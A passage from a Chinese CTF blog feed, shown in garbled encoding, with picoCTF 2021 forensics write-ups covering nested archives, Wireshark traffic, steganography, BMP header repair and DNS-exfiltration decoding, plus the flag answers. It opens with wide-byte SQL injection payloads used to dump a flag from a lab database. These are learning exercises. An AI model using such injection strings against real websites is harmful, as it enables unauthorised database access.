<p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210113173544299.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°äº†flag<br>ç»§ç»­æŸ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union%20select%201,group_concat(flag)%20from ctf4%23</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥è¿™æ ·æŸ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0%df%27%20union select 1,(select flag from ctf4)%23</span><br></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210113174012340.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™æ ·å°±æ‰¾åˆ°flagäº†</p>
]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>picoctf forensics</title>
    <url>/2021/05/20/pico21/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="Matryoshka-doll"><a href="#Matryoshka-doll" class="headerlink" title="Matryoshka doll"></a>Matryoshka doll</h2><p>é¢˜ç›®é™„ä»¶ä¸‹è½½ï¼š<a href="https://pan.baidu.com/s/1tcH_4VUeuRwD0SHdM-D50w">T0MR</a></p>
<p>æ˜æ˜¾çš„å¥—å¨ƒé¢˜ï¼Œå¯ä»¥ç›´æ¥æ‰”åˆ°kalié‡Œè¾¹ç”¨binwalkåˆ†ç¦»ï¼Œä¸€å…±æœ‰4å±‚ï¼Œä¹‹åå°±èƒ½çœ‹åˆ°flag.txtï¼Œå»é™¤ä¹±ç ç»„åˆå­—ç¬¦å°±æ˜¯flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">picoctf&#123;e3f378fe6c1ea7f6bc5ac2c3d6801c1f&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨pythonè„šæœ¬è·‘å‡ºæ¥flag.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;dolls.png&quot;</span></span><br><span class="line">extract_dir = <span class="string">&quot;ext&quot;</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> flag == <span class="number">0</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;\n== Extracting ==\n&quot;</span>)</span><br><span class="line">	os.system(<span class="string">&quot;unzip &#123;&#125; -d &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename,extract_dir))</span><br><span class="line">    <span class="comment">#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ unzip  æŠŠæ–‡ä»¶è§£å‹åˆ°æŒ‡å®šç›®å½•é‡Œ</span></span><br><span class="line">	<span class="keyword">if</span> os.path.exists(extract_dir+<span class="string">&quot;/base_images&quot;</span>):</span><br><span class="line">		os.chdir(extract_dir+<span class="string">&quot;/base_images&quot;</span>)</span><br><span class="line">        <span class="comment">#å¦‚æœç›®æ ‡è·¯å¾„å·²å­˜åœ¨çš„è¯ï¼Œåˆ‡æ¢åˆ°æŒ‡å®šè·¯å¾„</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		os.chdir(extract_dir)</span><br><span class="line">	<span class="keyword">for</span> file <span class="keyword">in</span> os.listdir():</span><br><span class="line">        <span class="comment">#éå†ç›®å½•ä¸­çš„æ–‡ä»¶å¤¹ï¼Œä¸€å±‚ä¸€å±‚çš„æŸ¥æ‰¾</span></span><br><span class="line">		<span class="keyword">if</span> file.endswith(<span class="string">&quot;.txt&quot;</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;\n== FLAG: &quot;</span>)</span><br><span class="line">			<span class="built_in">print</span>(os.system(<span class="string">&quot;cat &#123;&#125;&quot;</span>.<span class="built_in">format</span>(file)))</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			filename = file</span><br></pre></td></tr></table></figure>

<p>åœ¨kaliä¸­è¿è¡Œè„šæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(hackã‰¿hack)-[~&#x2F;æ¡Œé¢&#x2F;13]</span><br><span class="line">â””â”€$ python3 1.py                                                         1 â¨¯</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  dolls.png</span><br><span class="line">warning [dolls.png]:  272492 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;base_images&#x2F;2_c.jpg  </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  2_c.jpg</span><br><span class="line">warning [2_c.jpg]:  187707 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;base_images&#x2F;3_c.jpg  </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  3_c.jpg</span><br><span class="line">warning [3_c.jpg]:  123606 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;base_images&#x2F;4_c.jpg  </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; Extracting &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Archive:  4_c.jpg</span><br><span class="line">warning [4_c.jpg]:  79578 extra bytes at beginning or within zipfile</span><br><span class="line">  (attempting to process anyway)</span><br><span class="line">  inflating: ext&#x2F;flag.txt            </span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D; FLAG: </span><br><span class="line">picoCTF&#123;e3f378fe6c1ea7f6bc5ac2c3d6801c1f&#125;0</span><br></pre></td></tr></table></figure>

<h2 id="Wireshark-doo-dooo-do-dooâ€¦"><a href="#Wireshark-doo-dooo-do-dooâ€¦" class="headerlink" title="Wireshark doo dooo do dooâ€¦"></a>Wireshark doo dooo do dooâ€¦</h2><p>æµé‡åˆ†æé¢˜</p>
<p>ç”¨wiresharkæ‰“å¼€ï¼Œè¿‡æ»¤å‡ºhttpï¼Œæ‰¾åˆ°çŠ¶æ€ç ä¸º200OKçš„åŒ…</p>
<p>å¤§å¤šéƒ½æ˜¯åŠ å¯†çš„åŒ…ï¼Œåœ¨é è¿‘åº•éƒ¨çš„éƒ¨åˆ†ï¼Œå‡ºç°äº†ä¸€ä¸ªğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/f4/9f00d0766d02a7400041eabfe86db73b8af78d.png"></p>
<p>å³é”®è¿½è¸ªhttpæµ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 18.222.37.134</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 10 Aug 2020 01:51:45 GMT</span><br><span class="line">Server: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">Last-Modified: Fri, 07 Aug 2020 00:45:02 GMT</span><br><span class="line">ETag: &quot;2f-5ac3eea4fcf01&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 47</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">Gur synt vf cvpbPGS&#123;c33xno00_1_f33_h_qrnqorrs&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>Gur synt vf cvpbPGS&#123;c33xno00_1_f33_h_qrnqorrs&#125;</code>å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªå‡¯æ’’åŠ å¯†ï¼Œçˆ†ç ´ä¸€ä¸‹å³å¯</p>
<p>å¾—åˆ°flagï¼š<code>The flag is picoCTF&#123;p33kab00_1_s33_u_deadbeef&#125;</code></p>
<p>ä¹Ÿå¯ä»¥ç”¨<a href="https://www.boxentriq.com/code-breaking/rot13">rot13åœ¨çº¿è§£ç </a></p>
<h2 id="Milkslap"><a href="#Milkslap" class="headerlink" title="Milkslap"></a>Milkslap</h2><p>é¢˜ç›®æŒ‡å‘ï¼š<a href="http://mercury.picoctf.net:58537/">http://mercury.picoctf.net:58537/</a></p>
<p>æ‰“å¼€æ˜¯ä¸ªgifå›¾ç‰‡ï¼Œçœ‹ä¸€ä¸‹æºç å¹¶æ²¡æœ‰å‘ç°å›¾ç‰‡çš„ä½ç½®</p>
<p>ç¿»çœ‹ä¸€ä¸‹cssğŸ‘‡</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* source: milkslap-milkslap.scss */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: inherit; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1080px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">720px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#image</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">720px</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">5%</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">concat_v.png</span>);</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">0</span> <span class="number">0</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#foot</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999999</span>; &#125;</span><br><span class="line">  <span class="selector-id">#foot</span> <span class="selector-tag">h1</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: serif;</span><br><span class="line">    <span class="attribute">font-weight</span>: normal;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center; &#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾ å›¾ç‰‡æ‰€åœ¨çš„urlä¸º <a href="http://mercury.picoctf.net:58537/concat_v.png">http://mercury.picoctf.net:58537/concat_v.png</a></p>
<p>å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ï¼Œæ‰”åˆ°kaliä¸­ç”¨zstegæŸ¥çœ‹ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zsteg concat_v.png</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(hackã‰¿hack)-[~&#x2F;æ¡Œé¢&#x2F;13]</span><br><span class="line">â””â”€$ zsteg 159.png</span><br><span class="line">imagedata           .. text: &quot;\n\n\n\n\n\n\t\t&quot;</span><br><span class="line">b1,b,lsb,xy         .. text: &quot;picoCTF&#123;imag3_m4n1pul4t10n_sl4p5&#125;\n&quot;</span><br><span class="line">b1,bgr,lsb,xy       .. &lt;wbStego size&#x3D;9706075, data&#x3D;&quot;\xB6\xAD\xB6&#125;\xDB\xB2lR\x7F\xDF\x86\xB7c\xFC\xFF\xBF\x02Zr\x8E\xE2Z\x12\xD8q\xE5&amp;MJ-X:\xB5\xBF\xF7\x7F\xDB\xDFI\bm\xDB\xDB\x80m\x00\x00\x00\xB6m\xDB\xDB\xB6\x00\x00\x00\xB6\xB6\x00m\xDB\x12\x12m\xDB\xDB\x00\x00\x00\x00\x00\xB6m\xDB\x00\xB6\x00\x00\x00\xDB\xB6mm\xDB\xB6\xB6\x00\x00\x00\x00\x00m\xDB&quot;, even&#x3D;true, mix&#x3D;true, controlbyte&#x3D;&quot;[&quot;&gt;</span><br><span class="line">b2,r,lsb,xy         .. file: SoftQuad DESC or font file binary</span><br><span class="line">b2,r,msb,xy         .. file: VISX image file</span><br><span class="line">b2,g,lsb,xy         .. file: VISX image file</span><br><span class="line">b2,g,msb,xy         .. file: SoftQuad DESC or font file binary - version 15722</span><br><span class="line">b2,b,msb,xy         .. text: &quot;UfUUUU@UUU&quot;</span><br><span class="line">b4,r,lsb,xy         .. text: &quot;\&quot;\&quot;\&quot;\&quot;\&quot;#4D&quot;</span><br><span class="line">b4,r,msb,xy         .. text: &quot;wwww3333&quot;</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;wewwwwvUS&quot;</span><br><span class="line">b4,g,msb,xy         .. text: &quot;\&quot;\&quot;\&quot;\&quot;DDDD&quot;</span><br><span class="line">b4,b,lsb,xy         .. text: &quot;vdUeVwweDFw&quot;</span><br><span class="line">b4,b,msb,xy         .. text: &quot;UUYYUUUUUUUU&quot;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flagï¼š<code>picoCTF&#123;imag3_m4n1pul4t10n_sl4p5&#125;</code></p>
<p>kaliè£…zsteg rootä¸‹è¿è¡Œ <code>gem install zsteg</code></p>
<h2 id="tunn3l-v1s10n"><a href="#tunn3l-v1s10n" class="headerlink" title="tunn3l v1s10n"></a>tunn3l v1s10n</h2><p>é™„ä»¶ï¼š<a href="https://pan.baidu.com/s/1aSJZUTKFDXgEpaZroVcC1A">T0MR</a>ï¼ˆé‡Œè¾¹æœ‰åŸå›¾ä»¥åŠä¿®æ”¹åçš„å›¾ç‰‡</p>
<p><a href="https://en.wikipedia.org/wiki/BMP_file_format">å…³äºbmp</a></p>
<p>å¤§å°æ˜¯1134x306ï¼Œç”¨010editoræ‰“å¼€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">42 4d 8e 26 2c 00 00 00 00 00 ba d0 00 00 ba d0</span><br><span class="line">00 00 6e 04 00 00 32 01</span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">42 4d 8e 26 2c 00 00 00 00 00 36 00 00 00 28 00 </span><br><span class="line">00 00 6e 04 00 00 52 03</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´åŸç†ï¼š</p>
<p>æ‰”kalié‡Œè¾¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â””â”€$ exiftool 1.bmp</span><br><span class="line">ExifTool Version Number         : 12.16</span><br><span class="line">File Name                       : tunn3l_v1s10n_orig.bmp</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.8 MiB</span><br><span class="line">File Modification Date&#x2F;Time     : 2021:05:20 21:37:39+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2021:05:20 21:43:57+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2021:05:20 21:43:57+08:00</span><br><span class="line">File Permissions                : rw-------</span><br><span class="line">File Type                       : BMP</span><br><span class="line">File Type Extension             : bmp</span><br><span class="line">MIME Type                       : image&#x2F;bmp</span><br><span class="line">BMP Version                     : Unknown (53434)</span><br><span class="line">Image Width                     : 1134</span><br><span class="line">Image Height                    : 306</span><br><span class="line">Planes                          : 1</span><br><span class="line">Bit Depth                       : 24</span><br><span class="line">Compression                     : None</span><br><span class="line">Image Length                    : 2893400</span><br><span class="line">Pixels Per Meter X              : 5669</span><br><span class="line">Pixels Per Meter Y              : 5669</span><br><span class="line">Num Colors                      : Use BitDepth</span><br><span class="line">Num Important Colors            : All</span><br><span class="line">Red Mask                        : 0x27171a23</span><br><span class="line">Green Mask                      : 0x20291b1e</span><br><span class="line">Blue Mask                       : 0x1e212a1d</span><br><span class="line">Alpha Mask                      : 0x311a1d26</span><br><span class="line">Color Space                     : Unknown (,5%()</span><br><span class="line">Rendering Intent                : Unknown (826103054)</span><br><span class="line">Image Size                      : 1134x306</span><br><span class="line">Megapixels                      : 0.347</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¤§å°ä¸º1134x306</p>
<p>å¤§æ¦‚å°±æ˜¯ï¼Œå¾—åˆ°æ–‡ä»¶åº”è¯¥æœ‰çš„åƒç´ å€¼ï¼Œæ®æ­¤æ¥è°ƒæ•´å›¾ç‰‡æœ¬èº«çš„å®½å’Œé«˜ï¼Œä»¥æ­¤ä½¿å›¾ç‰‡å¯æ­£å¸¸æ˜¾ç¤º</p>
<p>å¾—åˆ°flagï¼š<code>picoCTF&#123;qu1t3_a_v13w_2020&#125;</code></p>
<p>å±å®æœ‰ç‚¹æ²¡çœ‹æ˜ç™½æ˜¯æ€ä¹ˆè®¡ç®—å‡ºåº”æœ‰çš„å°ºå¯¸çš„ã€‚ã€‚ã€‚</p>
<p>é™¤äº†è®¡ç®—ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹å›¾ç‰‡é«˜åº¦ä»¥æ­¤å‘ç°flag</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/tunn3l_v1s10n.md">https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/tunn3l_v1s10n.md</a></p>
<h2 id="Weird-File-å¥‡æ€ªçš„æ–‡ä»¶"><a href="#Weird-File-å¥‡æ€ªçš„æ–‡ä»¶" class="headerlink" title="Weird File(å¥‡æ€ªçš„æ–‡ä»¶)"></a>Weird File(å¥‡æ€ªçš„æ–‡ä»¶)</h2><p>é™„ä»¶: <a href="https://pan.baidu.com/s/1K-PFghHClMcG3m2tm6Aylw">T0MR</a></p>
<p>ç›´æ¥ä½œä¸ºå‹ç¼©åŒ…æ‰“å¼€å¼€å§‹ç¿»çœ‹å†…å®¹ï¼Œæœ€ç»ˆåœ¨ä¸€ä¸ªåä¸º <code>vbaProject.bin</code>çš„æ–‡ä»¶é‡Œè¾¹æœ‰è¿™æ ·ä¸€å¥è¯ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Shell(&quot;python -c &#39;print(\&quot;cGljb0NURnttNGNyMHNfcl9kNG5nM3IwdXN9\&quot;)</span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰printå‡ºæ¥çš„æ˜¯ä¸€ä¸ªbase64</p>
<p>è§£ç åå¾—flag <code>picoCTF&#123;m4cr0s_r_d4ng3r0us&#125;</code></p>
<h2 id="Trivial-Flag-Transfer-Protocol"><a href="#Trivial-Flag-Transfer-Protocol" class="headerlink" title="Trivial Flag Transfer Protocol"></a>Trivial Flag Transfer Protocol</h2><p>é™„ä»¶ï¼š<a href="https://pan.baidu.com/s/15AcBvftjcW_q71s_4uagfw">T0MR</a></p>
<p>ç”¨wiresharkæ‰“å¼€</p>
<p>å·¦ä¸Šè§’  æ–‡ä»¶â€“&gt;å¯¼å‡ºå¯¹è±¡â€“&gt;TFTP  å¾—åˆ°ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/da/76fba288fc4c1384c834669df29649b10e2388.png"></p>
<p>ç‚¹å‡»ä¸‹è¾¹å¾—save all å…¨éƒ¨ä¿å­˜ä¸‹æ¥</p>
<p>Instructions.txtçš„å†…å®¹ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GSGCQBRFAGRAPELCGBHEGENSSVPFBJRZHFGQVFTHVFRBHESYNTGENAFSRE.SVTHERBHGNJNLGBUVQRGURSYNTNAQVJVYYPURPXONPXSBEGURCYNA</span><br></pre></td></tr></table></figure>

<p><a href="https://www.boxentriq.com/code-breaking/rot13">rot13</a>è§£ä¸€ä¸‹å¾—</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TFTPDOESNTENCRYPTOURTRAFFICSOWEMUSTDISGUISEOURFLAGTRANSFER.FIGUREOUTAWAYTOHIDETHEFLAGANDIWILLCHECKBACKFORTHEPLAN</span><br><span class="line">ä¹Ÿå°±æ˜¯</span><br><span class="line">TFTP DOESNT ENCRYPT OUR TRAFFIC SO WE MUST DISGUISE OUR FLAG TRANSFER. FIGURE OUT A WAY TO HIDE THE FLAG AND I WILL CHECK BACK FOR THE PLAN</span><br><span class="line">ç¿»è¯‘ï¼š</span><br><span class="line">TFTPä¸ä¼šåŠ å¯†æˆ‘ä»¬çš„æµé‡ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»æ©ç›–æˆ‘ä»¬çš„flagè½¬ç§»ã€‚æƒ³å‡ºéšè—flagçš„æ–¹æ³•ï¼Œæˆ‘ä¼šå†æ£€æŸ¥ä¸€ä¸‹è¯¥è®¡åˆ’</span><br></pre></td></tr></table></figure>

<p>æåˆ°äº†è®¡åˆ’ä¹Ÿå°±æ˜¯planï¼ŒæŸ¥çœ‹ä¸€ä¸‹planå†…éƒ½æœ‰å•¥ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VHFRQGURCEBTENZNAQUVQVGJVGU-QHRQVYVTRAPR.PURPXBHGGURCUBGBF</span><br></pre></td></tr></table></figure>

<p>å†æ¬¡ä½¿ç”¨<a href="https://www.boxentriq.com/code-breaking/rot13">rot13è§£å¯†</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IUSEDTHEPROGRAMANDHIDITWITH-DUEDILIGENCE.CHECKOUTTHEPHOTOS</span><br><span class="line"></span><br><span class="line">I USED THE PROGRAM AND HID IT WITH-DUEDILIGENCE. CHECK OUT THE PHOTOS</span><br><span class="line"></span><br><span class="line">æˆ‘ä½¿ç”¨äº†è¯¥ç¨‹åºï¼Œå¹¶åŠæ—¶è¿›è¡Œäº†éšè—ã€‚æŸ¥çœ‹ç…§ç‰‡</span><br></pre></td></tr></table></figure>

<p>é‚£å°±æ‰“å¼€ç…§ç‰‡çœ‹çœ‹ã€‚æ„Ÿè§‰è¿™å‡ ä¸ªç…§ç‰‡æ²¡ä»€ä¹ˆå¤ªå¤§å…³ç³»ï¼Œæœ€å¤§å¯èƒ½å°±æ˜¯éšå†™äº†ï¼Œ</p>
<p>æƒ³èµ·æ¥ä¸Šè¾¹çš„<code>WITH-DUEDILIGENCE</code>å¯èƒ½<code>DUEDILIGENCE</code>å°±æ˜¯éšå†™çš„å¯†ç ï¼Œè¿™å°±æƒ³åˆ°äº†ä¸€ä¸ªå·¥å…·<code>steghide</code>.å¯¹ç¬¬ä¸‰ä¸ªå›¾ç‰‡ä½¿ç”¨è¿™ä¸ªå·¥å…·å¾—åˆ°ä¸€ä¸ªflag.txt</p>
<p>å¾—åˆ°flagï¼š<code>picoCTF&#123;h1dd3n_1n_pLa1n_51GHT_18375919&#125;</code></p>
<p>steghideå®‰è£…ä½¿ç”¨å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/pcat/p/5503237.html">https://www.cnblogs.com/pcat/p/5503237.html</a></p>
<h2 id="Wireshark-twoo-twooo-two-twooâ€¦"><a href="#Wireshark-twoo-twooo-two-twooâ€¦" class="headerlink" title="Wireshark twoo twooo two twooâ€¦"></a>Wireshark twoo twooo two twooâ€¦</h2><p>é™„ä»¶ï¼š<a href="https://pan.baidu.com/s/1GFcZrY1Kl428DnAQAqxvzw">T0MR</a></p>
<p>ç”¨wiresharkæ‰“å¼€ä¹‹åï¼Œå·¦ä¸Šè§’æ–‡ä»¶â€“&gt;å¯¼å‡ºå¯¹è±¡â€“&gt;http  å‘ç°ä¸€ä¸ªtext/htmlæ–‡ä»¶ï¼Œè¿½è¸ªæµå¾—ğŸ‘‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 18.217.1.57</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.0 200 OK</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 99</span><br><span class="line">Server: Werkzeug&#x2F;1.0.1 Python&#x2F;3.6.9</span><br><span class="line">Date: Mon, 10 Aug 2020 01:39:16 GMT</span><br><span class="line"></span><br><span class="line">The official Red&#39;s Shrimp and Herring website is still under construction. Please check back later!</span><br></pre></td></tr></table></figure>

<p>save allä¹‹ååœ¨æ–‡ä»¶å¤¹é‡Œå‘ç°äº†89ä¸ªflagï¼Œæ˜¾ç„¶éƒ½ä¸æ˜¯çœŸçš„</p>
<p>å›åˆ°wiresharké‡Œè¾¹ è¿‡æ»¤å‡ºdnsä¼šçœ‹åˆ°ğŸ‘‡                                                                <a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/2251573?fromtitle=DNS&fromid=427444&fr=aladdin">å…³äºdns</a></p>
<p><img src="https://img.vim-cn.com/5f/91a04d12eafad3ea864ce82a9273818522b4be.png"></p>
<p>è”æƒ³ä¸€ä¸‹ä¸Šè¾¹æåˆ°çš„ <code>Red&#39;s Shrimp and Herring website</code></p>
<p>æ­£å¥½å‡ºç°äº†<code>reddshrimpandherring.com</code></p>
<p>åœ¨kaliä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â””â”€$ curl http:&#x2F;&#x2F;www.reddshrimpandherring.com</span><br><span class="line">Congrats! Was that tooooo easy?</span><br><span class="line"></span><br><span class="line">Flag: cGljb0NURntmMXNoeV9zMXR1NHRpMG5fc2VsYmF0X3liYm9iX2VsdHRpbH0&#x3D;</span><br><span class="line"></span><br><span class="line">â””â”€$ echo cGljb0NURntmMXNoeV9zMXR1NHRpMG5fc2VsYmF0X3liYm9iX2VsdHRpbH0&#x3D; | base64 -d</span><br><span class="line">picoCTF&#123;f1shy_s1tu4ti0n_selbat_ybbob_elttil&#125;  </span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flagï¼Œbutè¿™ä¸ªflagä¹Ÿä¸å¯¹</p>
<p>æ„Ÿè§‰å­åŸŸååƒæ˜¯éšæœºå­—ç¬¦ï¼Œå†å»ç¿»çœ‹ä¸€ä¸‹ï¼Œå‘ç°äº† <code>18.217.1.57</code>å’Œ<code>192.168.38.104</code>ä¹‹é—´çš„æµé‡</p>
<p>å¯¹è¿™ä¸¤ä¸ªipçš„æµé‡ä¸­çš„<code>reddshrimpandherring.com</code>çš„å­åŸŸåè¿›è¡Œæ‹¼æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cGljb0NU+RntkbnNf+M3hmMWxf+ZnR3X2Rl+YWRiZWVm+fQ&#x3D;&#x3D;</span><br><span class="line">å¾—åˆ°</span><br><span class="line">cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ&#x3D;&#x3D;</span><br><span class="line">â””â”€$ echo cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ&#x3D;&#x3D;  | base64 -d</span><br><span class="line">picoCTF&#123;dns_3xf1l_ftw_deadbeef&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Surfing-the-Wavesï¼ˆä¸æ˜¯å¾ˆä¼š"><a href="#Surfing-the-Wavesï¼ˆä¸æ˜¯å¾ˆä¼š" class="headerlink" title="Surfing the Wavesï¼ˆä¸æ˜¯å¾ˆä¼š"></a>Surfing the Wavesï¼ˆä¸æ˜¯å¾ˆä¼š</h2><p>é™„ä»¶ï¼š<a href="https://pan.baidu.com/s/1EuR1t_-X0oOlUfCtFbiV-w">T0MR</a></p>
<p>å¾—åˆ°çš„éŸ³é¢‘æ˜¯1sé•¿çš„å™ªéŸ³</p>
